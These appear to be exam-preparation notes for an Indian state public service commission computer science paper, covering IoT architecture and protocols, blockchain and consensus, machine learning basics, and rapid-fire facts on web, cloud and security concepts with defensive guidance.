## 14.1 ⭐ Architecture layers

| Layer | ⭐ Function |
|---|---|
| ⭐ **1. Perception / Sensing** | ⭐ **SENSORS and ACTUATORS** — collect physical data and act on the environment |
| ⭐ **2. Network / Transport** | Connectivity — gateways, WiFi, cellular, LPWAN |
| **3. Processing / Middleware** | Data storage, analytics, device management, **edge/fog** processing |
| ⭐ **4. Application** | End-user services, dashboards, control interfaces |
| (5. Business) | Business models and decision-making |

⚠ ⭐ **Sensor vs actuator:**
- ⭐ A **SENSOR** converts a physical quantity into a signal — an **INPUT** (thermometer, camera, accelerometer)
- ⭐ An **ACTUATOR** converts a signal into physical action — an **OUTPUT** (motor, valve, relay, servo)

## 14.2 ⭐⭐ Protocols

| Protocol | ⭐ Model | ⭐ Transport | 💡 Note |
|---|---|---|---|
| ⭐ **MQTT** | ⭐ **PUBLISH / SUBSCRIBE** via a ⭐ **BROKER** | ⭐ **TCP** | ⭐ **The most-cited IoT protocol.** Extremely lightweight (2-byte minimum header); designed for constrained devices and unreliable networks. **QoS levels 0/1/2** |
| ⭐ **CoAP** | ⭐ **REQUEST / RESPONSE (REST-like)** | ⭐ **UDP** | Constrained Application Protocol — "HTTP for tiny devices" |
| **AMQP** | Message queuing | TCP | Enterprise-grade, reliable, heavier |
| **HTTP/HTTPS** | Request/response | TCP | Too heavy for very constrained devices |
| **XMPP** | Messaging | TCP | |

⚠⚠ ⭐ **The standard comparison: MQTT is PUBLISH/SUBSCRIBE over TCP with a broker; CoAP is REQUEST/RESPONSE over UDP.**

💡 **Why publish/subscribe suits IoT:** a thousand sensors publish to topics; any number of consumers subscribe to the topics they care about. Publishers and subscribers never need to know about each other, and a sensor can publish even if no consumer is currently listening.

⭐ **Connectivity technologies:**

| Technology | 💡 Characteristic |
|---|---|
| ⭐ **Zigbee** | IEEE 802.15.4; low-power **mesh** networking; smart home |
| ⭐ **BLE** (Bluetooth Low Energy) | Very low power, short range; wearables |
| **Z-Wave** | Proprietary home-automation mesh |
| **WiFi** | High bandwidth, high power consumption |
| ⭐ **LoRaWAN / NB-IoT / LTE-M** | ⭐ **LPWAN — very long range, very low power, very low data rate.** For meters and agricultural sensors |
| **RFID / NFC** | Very short range, often passive (no battery) |
| **5G (mMTC)** | Massive machine-type communication |

**Hardware:** **Arduino** (a microcontroller — simple, real-time, no OS) · **Raspberry Pi** (a single-board *computer* — runs Linux) · **ESP32/ESP8266** (microcontroller with built-in WiFi).

## 14.3 ⭐ IoT security concerns

⭐ **Why IoT security is notoriously bad:**
- ⭐ **Weak or default credentials** — ⭐ **the Mirai botnet (2016) built a million-device DDoS army simply by trying default passwords**
- Unencrypted communication (constrained devices skip TLS)
- ⭐ **No secure firmware-update mechanism** — devices are never patched
- A **huge attack surface** (billions of devices) with no central administration
- **Physical accessibility** — an attacker can pick up the device
- Limited compute for real cryptography
- **Privacy** of continuously collected personal data
- Long device lifecycles with **no vendor support**

**Applications:** smart home · smart city (traffic, lighting, waste) · ⭐ **industrial IoT / Industry 4.0** · precision agriculture · healthcare and wearables · smart grid and metering · logistics and asset tracking · connected vehicles.
⭐ **Digital twin** — a live virtual replica of a physical asset, continuously fed by IoT data, used for simulation and predictive maintenance.

---

## 15. ⭐⭐ Blockchain

### 💡 The idea

📌 ⭐ **A blockchain is a distributed, append-only ledger of transactions, replicated across many nodes, in which blocks are cryptographically chained together.**

💡 **The problem it solves:** normally, trusting a shared record requires trusting a **central authority** (a bank's ledger, a land registry). Blockchain lets **mutually distrusting parties** agree on a shared history **without** any central authority — enforced by cryptography and consensus rather than by an institution.

## 15.1 ⭐⭐⭐ Structure and immutability

⭐ **Each block contains a HEADER plus the transaction list. The header holds:**
- ⭐ **The cryptographic HASH OF THE PREVIOUS BLOCK**
- A **timestamp**
- The ⭐ **MERKLE ROOT** of the block's transactions
- A **nonce** and the difficulty target

```
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│ Block 1      │   │ Block 2      │   │ Block 3      │
│ prev: 000... │◄──│ prev: H(B1)  │◄──│ prev: H(B2)  │
│ merkle root  │   │ merkle root  │   │ merkle root  │
│ nonce        │   │ nonce        │   │ nonce        │
│ [txns]       │   │ [txns]       │   │ [txns]       │
└──────────────┘   └──────────────┘   └──────────────┘
```

### 💡⭐⭐ Why it is immutable — understand this, do not just memorise it

Each block stores the **hash of its predecessor**. Now suppose an attacker alters a transaction in Block 1:

1. Block 1's contents change → ⭐ **Block 1's hash changes** (avalanche effect, §13.2)
2. But Block 2 still stores the **old** hash of Block 1 → ⭐ **the chain is now broken and visibly invalid**
3. To hide that, the attacker must also recompute Block 2 — which changes Block 2's hash, breaking Block 3 — ⭐ **and so on for EVERY subsequent block**
4. Under proof of work, each of those recomputations requires enormous energy
5. Meanwhile the **honest network keeps extending the real chain**, so the attacker must out-compute the entire rest of the network — the ⭐ **51% attack** requirement

⭐ **So immutability comes from HASH CHAINING plus DISTRIBUTED CONSENSUS — not from encryption.** (The ledger is typically fully public and unencrypted.)

⭐ **Merkle tree (hash tree):** transactions are hashed in pairs, and those hashes in pairs, up to a single **Merkle root** stored in the header. ⭐ **This allows efficient verification that a transaction is included without downloading the whole block** (a "Merkle proof" needs only log n hashes).

## 15.2 ⭐ Key properties

⭐ **Decentralisation** (no single authority) · ⭐ **immutability / tamper-evidence** · **transparency** (anyone can audit) · ⭐ **distributed consensus** · **provenance** (full history) · pseudonymity · high availability.

## 15.3 ⭐⭐ Consensus mechanisms

### 💡 The problem

With no central authority, who decides which block comes next? A malicious actor could simply broadcast a false block. **Consensus mechanisms** make honesty cheaper than cheating.

| Mechanism | 💡 How it works | ⭐ Notes |
|---|---|---|
| ⭐ **PoW (Proof of Work)** | Miners race to find a **nonce** making the block's hash fall below a target — pure brute-force computation | ⭐ **Bitcoin.** Very secure, but ⭐ **ENORMOUSLY energy-intensive**; vulnerable in theory to a **51% attack** |
| ⭐ **PoS (Proof of Stake)** | Validators are chosen in proportion to the **stake they lock up**; cheating forfeits the stake | ⭐ **Ethereum (post-Merge).** ⭐ **Vastly more energy-efficient** |
| **DPoS** | Stakeholders **elect** delegates to validate | Faster, more centralised |
| **PBFT** | Byzantine fault-tolerant **voting** | Permissioned networks; tolerates < 1/3 faulty nodes |
| **PoA / PoET / PoB** | Proof of Authority / Elapsed Time / Burn | Various niches |

⚠ ⭐ **The standard PoW vs PoS question is about ENERGY CONSUMPTION.** PoW's security comes from spending real electricity; PoS replaces that with financial stake, eliminating the energy cost.

## 15.4 ⭐ Types of blockchain

| Type | ⭐ Access | Example |
|---|---|---|
| ⭐ **Public / permissionless** | ⭐ **Anyone can read, write and validate** | Bitcoin, Ethereum |
| ⭐ **Private / permissioned** | ⭐ **Restricted, known participants** | Hyperledger Fabric |
| **Consortium / federated** | Governed by a **group of organisations** | Trade-finance networks |
| **Hybrid** | Mixed public/private elements | |

## 15.5 ⭐ Smart contracts

📌 ⭐ **A smart contract is SELF-EXECUTING code stored on the blockchain, which runs automatically when predefined conditions are met** — with no intermediary and no possibility of one party refusing to honour it. *"Code is law."*

🔢 An insurance contract that automatically pays out if a trusted weather feed reports rainfall below a threshold — no claim, no assessor, no dispute.

⭐ **Platform:** **Ethereum**, written in ⭐ **Solidity**, executed by the ⭐ **EVM (Ethereum Virtual Machine)**. **Gas** fees meter the computation, preventing infinite loops.

⚠ ⭐ **Bugs are permanent**, because the deployed code is immutable — the 2016 **DAO hack** drained $50 million through a reentrancy bug that could not simply be patched.

⭐ **Applications:** supply-chain traceability · **land records** · digital identity · trade finance · voting · healthcare records · **DeFi** · NFTs.

⚠ ⭐ **Limitations:**
- ⭐ **The scalability trilemma** — you can optimise at most two of **decentralisation, security and scalability**
- Low throughput (Bitcoin ~7 transactions/second vs Visa's ~65,000)
- Ever-growing storage requirement
- Regulatory uncertainty
- Energy consumption (PoW)

⭐ **Related terms:** cryptocurrency · **wallet** (a keypair, not a store of coins) · **51% attack** · **fork** (soft = backward-compatible, hard = not) · ⭐ **DLT (Distributed Ledger Technology** — the broader category; blockchain is one kind of DLT) · **layer-2** scaling solutions.

---

## 16. ⭐⭐⭐ Artificial Intelligence

## 16.1 ⭐⭐ AI vs ML vs Deep Learning

### 💡 The relationship

📌 ⭐⭐ **AI ⊃ Machine Learning ⊃ Deep Learning** — three **nested** subsets, not synonyms.

```
┌─────────────────────────────────────────┐
│  ARTIFICIAL INTELLIGENCE                │
│  (any machine behaving intelligently:   │
│   rule-based expert systems, search,    │
│   planning, logic — NOT only learning)  │
│  ┌───────────────────────────────────┐  │
│  │  MACHINE LEARNING                 │  │
│  │  (learns patterns FROM DATA       │  │
│  │   instead of being programmed)    │  │
│  │  ┌─────────────────────────────┐  │  │
│  │  │  DEEP LEARNING              │  │  │
│  │  │  (multi-layer neural nets;  │  │  │
│  │  │   learns features itself)   │  │  │
│  │  └─────────────────────────────┘  │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

⚠ ⭐ **AI is NOT only machine learning.** A chess program using minimax search, or a 1980s medical expert system with hand-written rules, is AI with no learning at all.

💡 **The essential difference between programming and ML:**
- **Traditional programming:** you write the **rules**; data goes in, answers come out
- ⭐ **Machine learning:** you supply **data and answers**; the algorithm produces the **rules** (a model)

⭐ **Scope of AI:** ⭐ **Narrow (weak) AI** — task-specific; **everything that exists today**. **General AI (AGI)** — human-level breadth; hypothetical. **Super AI** — beyond human; hypothetical.

⭐ **Historical facts:** the ⭐ **Turing Test** (Alan Turing, 1950) — a behavioural test of machine intelligence. The term "artificial intelligence" was coined at the ⭐ **Dartmouth Conference, 1956** (John McCarthy).

## 16.2 ⭐⭐⭐ Types of machine learning

| Type | ⭐ Data | Goal | ⭐ Algorithms | 🔢 Examples |
|---|---|---|---|---|
| ⭐ **Supervised** | ⭐ **LABELLED** | Predict a label or value | Linear & logistic regression, decision trees, random forest, SVM, k-NN, naïve Bayes, neural networks | Spam detection, house-price prediction, image classification |
| ⭐ **Unsupervised** | ⭐ **UNLABELLED** | Find hidden structure | ⭐ **k-means**, hierarchical clustering, DBSCAN, ⭐ **PCA**, apriori | Customer segmentation, anomaly detection, market-basket analysis |
| **Semi-supervised** | Mostly unlabelled + a little labelled | Use cheap unlabelled data to help | | |
| ⭐ **Reinforcement** | ⭐ **A REWARD SIGNAL from an environment** | Learn a **policy** maximising cumulative reward | Q-learning, SARSA, deep Q-networks, policy gradients | Game playing (**AlphaGo**), robotics, control systems |

⭐⭐ **The three-way split is the most-asked AI question:**
📌 ⭐ **Supervised = LABELLED data · Unsupervised = UNLABELLED data · Reinforcement = REWARD/PENALTY feedback**

💡 **Analogy:**
- **Supervised** = learning with a teacher who marks every answer
- **Unsupervised** = being handed a pile of photographs and asked to sort them into groups, with no categories given
- **Reinforcement** = learning to ride a bicycle — nobody labels each movement, but falling over is a clear penalty

⭐ **Within supervised learning:**
📌 ⭐ **CLASSIFICATION predicts a DISCRETE class** (spam / not spam; digit 0–9)
📌 ⭐ **REGRESSION predicts a CONTINUOUS value** (price, temperature)

⭐ **Clustering** (k-means) is the *unsupervised* analogue of classification — it finds groups without being told what they are.

## 16.3 ⭐ Neural networks

### 💡 The idea

A **neural network** is a stack of layers of simple units. Each unit computes a **weighted sum** of its inputs plus a **bias**, then applies a non-linear **activation function**.

```
Input layer      Hidden layer(s)      Output layer
   x1 ──┐         ┌──►(  )──┐
   x2 ──┼────────►│  (  )   ├────►( )──► prediction
   x3 ──┘         └──►(  )──┘
        (weighted connections)
```

⭐ **Activation functions:**

| Function | Range | 💡 Note |
|---|---|---|
| **Sigmoid** | 0 to 1 | Historically standard; suffers **vanishing gradients** |
| **tanh** | −1 to 1 | Zero-centred version of sigmoid |
| ⭐ **ReLU** — max(0, x) | 0 to ∞ | ⭐ **The modern default** — simple, and avoids vanishing gradients |
| ⭐ **Softmax** | 0 to 1, summing to 1 | ⭐ **Multi-class output probabilities** |

⚠ ⭐ **Without a non-linear activation, a deep network collapses to a single linear function** — the depth would be pointless. Non-linearity is what makes deep learning work.

⭐ **Training — the cycle:**
1. ⭐ **Forward propagation** — push the input through the network to get a prediction
2. Compute the **loss** (how wrong the prediction was)
3. ⭐ **BACKPROPAGATION** — compute the gradient of the loss with respect to every weight, using the **chain rule**, working backwards
4. ⭐ **Gradient descent** — nudge every weight in the direction that reduces the loss
5. Repeat for many **epochs**

**Hyperparameters:** learning rate, number of epochs, batch size, network depth and width.

### ⭐ Architectures

| Architecture | ⭐ Designed for | 💡 Why |
|---|---|---|
| ⭐ **CNN (Convolutional NN)** | ⭐ **IMAGES / vision** | **Convolution** and **pooling** layers exploit **spatial locality** — a feature detector is reused across the whole image |
| ⭐ **RNN / LSTM / GRU** | ⭐ **SEQUENCES** — text, speech, time series | Has a **memory** of previous inputs. ⭐ **LSTM solves the vanishing-gradient problem** of plain RNNs |
| ⭐ **Transformer** | ⭐ **The basis of modern LLMs** (BERT, GPT) | Uses **attention** instead of recurrence → **parallelisable** and handles long-range dependencies |
| **GAN** | Generation/synthesis | A **generator** and a **discriminator** trained against each other |
| **Autoencoder** | Dimensionality reduction, denoising | Learns to compress and reconstruct |

## 16.4 ⭐⭐ Model evaluation

### 💡 The confusion matrix

```
                    PREDICTED
                 Positive   Negative
ACTUAL Positive    TP         FN      (Type II error — a miss)
       Negative    FP         TN
                (Type I error —
                 false alarm)
```

📌 ⭐ **Accuracy = (TP + TN) / Total**
📌 ⭐ **Precision = TP / (TP + FP)** — *of everything I flagged as positive, how much really was?*
📌 ⭐ **Recall (sensitivity) = TP / (TP + FN)** — *of all the actual positives, how many did I find?*
📌 ⭐ **F1 score = 2 × (Precision × Recall) / (Precision + Recall)** — the **harmonic mean**, which punishes a bad score in either

### ⚠⭐ Why accuracy is a trap on imbalanced data

🔢 A cancer screening test where 1% of patients have cancer. A model that simply says **"nobody has cancer"** achieves ⭐ **99% accuracy** — while being completely useless (recall = 0).

⭐ **On imbalanced data, use PRECISION, RECALL, F1 or AUC-ROC — not accuracy.**

💡 **Precision vs recall trade-off:** a spam filter with high **precision** rarely misclassifies a real email as spam (few false alarms) but may let spam through. High **recall** catches nearly all spam but may quarantine some real mail. Which you want depends on the cost of each error type.

### ⭐⭐ Overfitting vs underfitting

| | ⭐ **Overfitting** | ⭐ **Underfitting** |
|---|---|---|
| ⭐ **Training error** | ⭐ **LOW** | High |
| ⭐ **Test error** | ⭐ **HIGH** | High |
| Cause | Model **too complex** — it **memorises the noise** | Model **too simple** to capture the pattern |
| ⭐ **Fixes** | ⭐ **More data, REGULARISATION (L1/L2), DROPOUT, early stopping, cross-validation, simpler model** | More complex model, better features, train longer |

⭐ **The signature of overfitting: excellent on training data, poor on unseen data.**

💡 **Analogy:** a student who memorises last year's question paper scores perfectly on it and fails the new exam. That is overfitting — memorisation instead of generalisation.

📌 ⭐ **The bias–variance trade-off:** underfitting = **high bias**; overfitting = **high variance**. Model selection is about balancing the two.

**Data splits:** training / validation / test. ⭐ **k-fold cross-validation** rotates the validation set to use all the data while still measuring generalisation.

## 16.5 ⭐ Applications, subfields and ethics

⭐ **Subfields:** ⭐ **NLP** (translation, sentiment analysis, chatbots, **LLMs**) · ⭐ **Computer vision** (object detection, face recognition, OCR) · speech recognition and synthesis · **recommender systems** · robotics · **expert systems** · ⭐ **generative AI** · autonomous vehicles · fraud detection · medical diagnosis · predictive maintenance.

⭐ **AI ethics and governance — increasingly examinable:**
- ⭐ **Algorithmic bias and fairness** — a model trained on biased historical data reproduces and amplifies that bias
- ⭐ **Explainability / XAI** — the **"black box" problem**: a deep network cannot easily justify its decision, which is unacceptable for loan approvals or medical diagnoses
- **Privacy** of training data
- **Accountability** — who is liable when an autonomous system errs?
- Job displacement · ⭐ **deepfakes and misinformation** · ⭐ **hallucination** in generative models

⭐ **Indian AI and digital policy context** (valuable for both Paper-II §13 and Paper-I current affairs):
⭐ **IndiaAI Mission** · **NITI Aayog's National Strategy for AI (#AIforAll)** and **Responsible AI** principles · **Digital India** · ⭐ **DPDP Act 2023** · **India Semiconductor Mission** · ⭐ **India Stack — Aadhaar, UPI, DigiLocker, UMANG, ONDC** · **BharatNet** · **National Supercomputing Mission (PARAM)** · **MeitY** as the nodal ministry.

---

# 17. ⭐ Rapid-fire facts

## Web

| Fact | Value |
|---|---|
| HTML / CSS / JavaScript roles | **Structure / presentation / behaviour** |
| HTML5 semantic tags | article, section, header, footer, nav, aside, main |
| Non-semantic tags | **div, span** |
| Presentational (deprecated) | b, i, font, center |
| Canvas vs SVG | Bitmap / **vector** |
| **localStorage vs sessionStorage** | ⭐ **Persistent / per-tab** |
| **Cookies** | ⭐ **~4 KB, sent with EVERY request** |
| Web storage sent to server? | **No** |
| Form GET vs POST | URL / **body** |
| Best way to include CSS | **External** stylesheet |
| **CSS specificity** | ⭐ **!important > inline > ID > class > element > universal** |
| Specificity tie broken by | The **later** rule |
| Direct child selector | ⭐ **`A > B`** |
| **Box model order** | ⭐ **content → padding → border → margin** |
| Padding is | ⭐ **INSIDE the border** |
| Responsive design uses | ⭐ **Media queries** |
| Mobile-first means | Smallest breakpoint styles first |
| Flexbox / Grid | 1-D / **2-D** layout |
| **Well-formed vs valid XML** | ⭐ **Syntax / conforms to DTD-XSD** |
| Valid ⇒ well-formed? | ⭐ **Yes (one-way)** |
| **XSD is written in** | ⭐ **XML** |
| XSD supports | **Data types** (DTD does not) |
| **XSLT / XPath** | ⭐ **Transforms / navigates** |
| DOM vs SAX parsing | Whole tree in memory / **streaming** |
| JSON vs XML | Compact, native to JS / verbose, typed |
| 3-tier layers | Presentation, application, data |
| Thin client | Relies on the server; needs connectivity |
| **Web server / application server** | ⭐ **Static content / business logic** |
| Apache, Nginx, IIS | Web servers |
| Tomcat, JBoss, WebLogic | Application servers |
| **Forward proxy** | ⭐ **In front of CLIENTS; hides the client** |
| **Reverse proxy** | ⭐ **In front of SERVERS; LOAD BALANCING** |
| **MVC: handles input** | ⭐ **Controller** |
| MVC: data + business logic | **Model** |
| MVVM used by | Angular |
| **REST vs SOAP** | ⭐ **Architectural STYLE / PROTOCOL** |
| SOAP message format | **XML only** |
| **SOAP contract / discovery** | ⭐ **WSDL / UDDI** |
| SOAP envelope parts | Header + Body (Fault on error) |
| REST is | **Stateless** |
| **Idempotent: PUT / POST** | ⭐ **Yes / NO** |
| **AJAX** | Async requests **without page reload** |
| AJAX usually carries | **JSON** |
| DOM is provided by | The **browser** (W3C API, not JS) |
| **React vs Angular** | ⭐ **Library / framework** |
| React uses | **Virtual DOM**, one-way data flow |
| Node.js is | A JS **runtime** for the server |
| JWT structure | header.payload.signature |

## Cloud

| Fact | Value |
|---|---|
| **NIST essential characteristics** | ⭐ **5: on-demand self-service, broad network access, resource pooling, rapid elasticity, measured service** |
| **Customer manages the OS in** | ⭐ **IaaS** |
| Gmail, Salesforce, Office 365 | **SaaS** |
| Heroku, App Engine, Beanstalk | **PaaS** |
| EC2, Azure VMs, GCE | **IaaS** |
| Who patches the guest OS in IaaS | ⭐ **The customer** |
| Deployment models | Public, private, hybrid, community |
| Most control / cheapest | Private / public |
| Sensitive data private + burst public | **Hybrid** |
| Shared by similar organisations | **Community** |
| **Type-1 hypervisor** | ⭐ **Bare metal — ESXi, Hyper-V, Xen, KVM** |
| **Type-2 hypervisor** | ⭐ **Hosted — VirtualBox, VMware Workstation** |
| **Containers share** | ⭐ **The HOST OS KERNEL** |
| **Stronger isolation** | ⭐ **VMs** |
| Lighter and faster | **Containers** |
| Container orchestration | ⭐ **Kubernetes** |
| Smallest K8s unit | ⭐ **Pod** |
| **Databases need** | ⭐ **BLOCK storage** |
| Shared file access | **File** storage (NFS/SMB) |
| **S3, Azure Blob** | ⭐ **OBJECT storage — flat, HTTP/REST** |
| Object storage hierarchy | ⭐ **Flat** ("folders" are prefixes) |
| Scale up / scale out | **Vertical / horizontal** |
| Cloud elasticity means | **Horizontal** auto-scaling |
| 99.9% SLA downtime | ~8.77 hours/year |
| SDN separates | ⭐ **Control plane from data plane** |
| **Edge computing motive** | ⭐ **Reduce LATENCY and BANDWIDTH** |
| **Fog layer sits** | ⭐ **Between edge and cloud (gateways/LAN)** |
| Lowest latency / highest compute | **Edge / cloud** |
| 6 R's of migration | Rehost, replatform, refactor, repurchase, retire, retain |
| Govt of India cloud | ⭐ **MeghRaj** (NIC National Cloud) |
| Main cloud drawback | **Vendor lock-in**, data sovereignty, connectivity |

## Security & Emerging

| Fact | Value |
|---|---|
| Root cause of most vulnerabilities | ⭐ **Trusting input; data treated as code** |
| Validate input on | ⭐ **The SERVER side** |
| Allow-list vs deny-list | ⭐ **Allow-list is safer** |
| "No security through obscurity" | Open design principle |
| Buffer overflow mitigations | ASLR, DEP/NX, stack canaries, bounds checking |
| STRIDE | Threat modelling |
| SAST / DAST | Static / dynamic analysis |
| **OWASP A01 (2021)** | ⭐ **Broken Access Control** |
| **OWASP A03 (2021)** | ⭐ **Injection** (was #1 in 2013/2017) |
| OWASP A10 (2021) | SSRF |
| **SQL injection fix** | ⭐ **Parameterised queries / prepared statements** |
| Hiding error messages | ⭐ **NOT a fix** |
| **XSS executes in** | ⭐ **The victim's BROWSER** |
| XSS types | **Stored, reflected, DOM-based** |
| **XSS defence** | ⭐ **Output encoding + CSP + HttpOnly** |
| **CSRF defence** | ⭐ **Anti-CSRF tokens, SameSite** |
| XSS vs CSRF | Trust in **input** / trust in the **authenticated browser** |
| **Symmetric keys for n users** | ⭐ **n(n−1)/2** |
| **Asymmetric keys for n users** | ⭐ **2n** |
| Symmetric / asymmetric speed | **Fast / slow** |
| Current symmetric standard | ⭐ **AES** |
| DES effective key | **56 bits** — broken |
| **RSA is based on** | ⭐ **Integer factorisation** |
| ECC advantage | Smaller keys for equal security |
| Diffie–Hellman does | **Key exchange only** |
| **Why HTTPS uses both** | ⭐ **Asymmetric to exchange a session key, symmetric for bulk data** |
| **Digital signature uses** | ⭐ **The SENDER'S PRIVATE key** |
| **Encrypt for confidentiality with** | ⭐ **The RECEIVER'S PUBLIC key** |
| **Signature provides** | ⭐ **Authentication, integrity, non-repudiation — NOT confidentiality** |
| Broken hash functions | ⭐ **MD5, SHA-1** |
| Current hash standard | SHA-256 |
| **Password storage** | ⭐ **Salt + bcrypt/Argon2/PBKDF2** |
| Salt defeats | ⭐ **Rainbow tables** |
| Hashing vs encryption vs encoding | One-way / reversible / **not security** |
| **CIA triad** | ⭐ **Confidentiality, Integrity, Availability** |
| **DDoS targets** | ⭐ **Availability**; uses a **botnet** |
| **Self-replicating malware** | ⭐ **Worm** (a virus needs a host) |
| Rainbow table attack | Precomputed hashes |
| **IDS vs IPS** | ⭐ **Detects/alerts vs BLOCKS (inline)** |
| WAF protects against | SQLi, XSS |
| MFA factors | **Know / have / are** |
| **India's cyber law** | ⭐ **IT Act 2000** (amended 2008) |
| IT Act 66C / 66D / 66F | Identity theft / personation / cyber terrorism |
| India's data protection law | ⭐ **DPDP Act 2023** |
| **National CERT** | ⭐ **CERT-In** (6-hour reporting) |
| **MQTT** | ⭐ **Pub/sub, TCP, BROKER** |
| **CoAP** | ⭐ **Request/response, UDP** |
| IoT layer 1 | ⭐ **Perception / sensing** |
| Sensor vs actuator | **Input / output** |
| LPWAN examples | LoRaWAN, NB-IoT |
| Zigbee / BLE | Low-power mesh / very low power short range |
| Mirai botnet exploited | ⭐ **Default credentials** |
| Digital twin | Live virtual replica of a physical asset |
| **Blockchain immutability from** | ⭐ **Previous-block HASH CHAINING + consensus** |
| Merkle root enables | Efficient inclusion proofs |
| **Bitcoin consensus** | ⭐ **PoW** (energy-intensive) |
| **Energy-efficient consensus** | ⭐ **PoS** (Ethereum) |
| 51% attack | Out-computing the honest majority |
| Blockchain types | Public, private, consortium, hybrid |
| **Self-executing blockchain code** | ⭐ **Smart contract** |
| Ethereum contract language | ⭐ **Solidity** (runs on the EVM) |
| Scalability trilemma | Decentralisation, security, scalability |
| DLT vs blockchain | Blockchain is one **kind** of DLT |
| **AI ⊃ ML ⊃ DL** | ⭐ **Nested subsets** |
| Turing Test / term coined | 1950 / **Dartmouth 1956** |
| All current AI is | **Narrow (weak) AI** |
| **Supervised learning needs** | ⭐ **LABELLED data** |
| **Unsupervised (k-means, PCA)** | ⭐ **UNLABELLED data** |
| **Reinforcement learning** | ⭐ **Reward/penalty from an environment** |
| Classification vs regression | **Discrete class / continuous value** |
| **CNN for / RNN-LSTM for** | ⭐ **Images / sequences** |
| **LLMs built on** | ⭐ **Transformers (attention)** |
| Modern default activation | ⭐ **ReLU** |
| Multi-class output activation | **Softmax** |
| Training algorithm | ⭐ **Backpropagation + gradient descent** |
| **Precision / Recall** | ⭐ **TP/(TP+FP) / TP/(TP+FN)** |
| F1 score | Harmonic mean of precision & recall |
| **Low train error, high test error** | ⭐ **OVERFITTING** |
| **Overfitting fixes** | ⭐ **Regularisation, dropout, more data, early stopping** |
| Underfitting / overfitting | High **bias** / high **variance** |
| Accuracy is misleading on | ⭐ **Imbalanced data** |
| XAI addresses | The **black box** problem |
| India's AI mission | **IndiaAI**; NITI Aayog #AIforAll |

---

# 18. ⚠ Common traps

1. ⭐⭐ **REST is an architectural STYLE; SOAP is a PROTOCOL.**
2. ⭐⭐ **Reverse proxy = in front of SERVERS (load balancing); forward proxy = in front of CLIENTS (anonymity).**
3. ⭐⭐ **Box model: PADDING is INSIDE the border, MARGIN outside.**
4. ⭐ **Every valid XML document is well-formed, but not vice versa.**
5. ⭐ **PUT is idempotent; POST is not.**
6. ⭐ **localStorage persists; sessionStorage dies with the tab. Only COOKIES are sent to the server.**
7. ⭐⭐ **In IaaS the CUSTOMER patches the guest OS**, not the provider.
8. ⭐⭐ **Containers are lighter and faster; VMs isolate better.** Both halves matter.
9. ⭐ **Object storage is FLAT and HTTP-accessed; databases need BLOCK storage.**
10. ⭐ **Edge < Fog < Cloud in both latency and compute power.**
11. ⭐⭐ **Broken Access Control is A01 in OWASP 2021; Injection fell to A03.**
12. ⭐⭐ **Digital signatures use the SENDER'S PRIVATE key — and give NO confidentiality.**
13. ⭐⭐ **Hashing is one-way; encryption is reversible; encoding is neither.**
14. ⭐ **IDS alerts; IPS blocks.**
15. ⭐ **A worm self-replicates; a virus needs a host.**
16. ⭐ **MQTT is pub/sub over TCP; CoAP is request/response over UDP.**
17. ⭐⭐ **Blockchain immutability comes from HASH CHAINING, not from encryption.**
18. ⭐ **PoS saves energy; PoW consumes it.**
19. ⭐⭐ **AI ⊃ ML ⊃ Deep Learning** — and AI is **not** only machine learning.
20. ⭐ **k-means is unsupervised**, not supervised.
21. ⭐ **Overfitting = LOW training error but HIGH test error.**
22. ⭐ **Accuracy is a poor metric on imbalanced datasets** — use precision/recall/F1.
23. **XSS attacks the browser; SQL injection attacks the database; CSRF abuses an authenticated session.**
24. **Hiding error messages is not a fix for SQL injection.**
25. **A web server serves static content; an application server runs code.**

---

# 19. Practice

- **Web:** [`Paper2_S12_Web_Technologies/`](../02_State_PSC_PYQs/Subject_wise/Paper2_S12_Web_Technologies/) — 65 questions
- **Cloud:** [`Paper2_S14_Cloud_Technology/`](../02_State_PSC_PYQs/Subject_wise/Paper2_S14_Cloud_Technology/) — only 8 questions
- **Security/Emerging:** [`Paper2_S13_Cyber_Security_and_Emerging_Tech/`](../02_State_PSC_PYQs/Subject_wise/Paper2_S13_Cyber_Security_and_Emerging_Tech/) — 66 questions
- ⭐ **Also:** `02_State_PSC_PYQs/Papers/Other_State_PSCs/Arunachal_Pradesh_PSC/APPSC_2021_AssistantSystemManager_PracticalProgramming_and_WebDesign.pdf` — an entire real paper on programming and **web design**
- ⚠ **No GATE coverage exists for any of these three sections.**
- Test: [`Week_10_Test.md`](../04_Mock_Tests/Week_10_Test.md)

⭐ **Because the PYQ pool is thin, THESE NOTES ARE YOUR PRIMARY SOURCE. Read them twice rather than hunting for more questions.**

**Priority order if short on time:** IaaS/PaaS/SaaS responsibility split → OWASP Top 10 by name → SQL injection & XSS defences → symmetric vs asymmetric + digital signature direction → MVC → REST vs SOAP → forward vs reverse proxy → CSS box model & specificity → VMs vs containers → the three storage types → edge/fog/cloud → supervised/unsupervised/reinforcement → blockchain immutability & PoW/PoS → MQTT vs CoAP → overfitting.
